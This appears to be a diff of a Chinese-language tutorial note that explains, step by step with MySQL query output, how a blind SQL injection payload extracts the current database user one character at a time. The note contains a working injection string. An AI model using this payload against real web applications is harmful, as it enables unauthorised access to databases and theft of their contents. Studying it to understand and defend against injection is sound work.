@@ -84,11 +84,11 @@ MID((IFNULL(CAST(CURRENT_USER() AS CHAR),0x20)),1,1)
 
 IFNULL(CAST(CURRENT_USER() AS CHAR),0x20)
 
-
 (CAST(CURRENT_USER() AS CHAR)
 
 获取当前用户
 [PAYLOAD] 1' AND ORD(MID((IFNULL(CAST(CURRENT_USER() AS CHAR),0x20)),1,1))>64 AND 'GDMD'='GDMD
+
 第一步：CURRENT_USER()取得当前用户
 mysql> SELECT CURRENT_USER();
 +----------------+
@@ -97,6 +97,7 @@ mysql> SELECT CURRENT_USER();
 | root@localhost |
 +----------------+
 1 row in set (0.00 sec)
+
 第二步：CAST对CURRENT_USER()返回的结果进行类型转换CHAR
 mysql> SELECT CAST(CURRENT_USER() AS CHAR);
 +------------------------------+
@@ -105,6 +106,7 @@ mysql> SELECT CAST(CURRENT_USER() AS CHAR);
 | root@localhost               |
 +------------------------------+
 1 row in set (0.00 sec)
+
 第三步：IFNULL判断CAST(CURRENT_USER() AS CHAR)的返回值是否为空
 mysql> SELECT IFNULL(CAST(CURRENT_USER() AS CHAR),0x20);
 +-------------------------------------------+
@@ -113,6 +115,7 @@ mysql> SELECT IFNULL(CAST(CURRENT_USER() AS CHAR),0x20);
 | root@localhost                            |
 +-------------------------------------------+
 1 row in set (0.00 sec)
+
 第四步：MID()函数返回第一个当前用户名的第一个字符
 mysql> SELECT MID((IFNULL(CAST(CURRENT_USER() AS CHAR),0x20)),1,1);
 +------------------------------------------------------+
@@ -121,6 +124,7 @@ mysql> SELECT MID((IFNULL(CAST(CURRENT_USER() AS CHAR),0x20)),1,1);
 | r                                                    |
 +------------------------------------------------------+
 1 row in set (0.00 sec)
+
 第五步：ORD() 函数返回字符串第一个字符的 ASCII 值
 mysql> SELECT ORD(MID((IFNULL(CAST(CURRENT_USER() AS CHAR),0x20)),1,1));
 +-----------------------------------------------------------+
@@ -129,6 +133,7 @@ mysql> SELECT ORD(MID((IFNULL(CAST(CURRENT_USER() AS CHAR),0x20)),1,1));
 |                                                       114 |
 +-----------------------------------------------------------+
 1 row in set (0.00 sec)
+
 第六步：ASCII 值比较，成功返回1，否则返回0
 mysql> SELECT ORD(MID((IFNULL(CAST(CURRENT_USER() AS CHAR),0x20)),1,1))>64;
 +--------------------------------------------------------------+
@@ -137,6 +142,7 @@ mysql> SELECT ORD(MID((IFNULL(CAST(CURRENT_USER() AS CHAR),0x20)),1,1))>64;
 |                                                            1 |
 +--------------------------------------------------------------+
 1 row in set (0.00 sec)
+
 第七步：AND 'GDMD'='GDMD 恒为真
 
 测试：
